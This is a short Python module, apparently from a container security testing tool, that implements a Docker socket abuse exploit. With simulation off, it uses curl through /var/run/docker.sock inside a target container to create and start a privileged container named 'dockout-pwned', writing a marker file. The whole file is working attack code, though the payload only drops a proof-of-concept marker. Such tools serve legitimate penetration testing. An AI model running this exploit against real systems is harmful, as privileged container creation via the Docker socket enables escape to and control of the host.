# Path: attacks/docker_socket_abuse.py

def run(container, simulate=False):
    print("[*] Running Docker Socket Abuse exploit...")

    if simulate:
        # Simulated execution: log intended attack
        print(f"[SIMULATE] Would attempt to create a privileged container via /var/run/docker.sock in '{container.name}'")
        print("[SIMULATE] This would result in a new container named 'dockout-pwned' with host access.")
        return "Simulated run: No container created."

    try:
        # ⚠️ REAL PAYLOAD EXECUTION (simulate=False)
        # Uses curl to send POST request to Docker socket to create a new container
        payload = (
            "curl --unix-socket /var/run/docker.sock -X POST "
            "-H 'Content-Type: application/json' "
            "-d '{\"Image\":\"alpine\",\"Cmd\":[\"sh\",\"-c\",\"echo pwned > /pwned.txt\"],"
            "\"HostConfig\":{\"Privileged\":true}}' "
            "http://localhost/containers/create?name=dockout-pwned"
        )
        container.exec_run(payload, privileged=True)

        # Start the created container
        container.exec_run("curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/dockout-pwned/start", privileged=True)

        print("[+] Created and started container 'dockout-pwned' via Docker socket abuse.")
        return "Executed: Privileged container created"

    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        return f"Failed: {str(e)}"
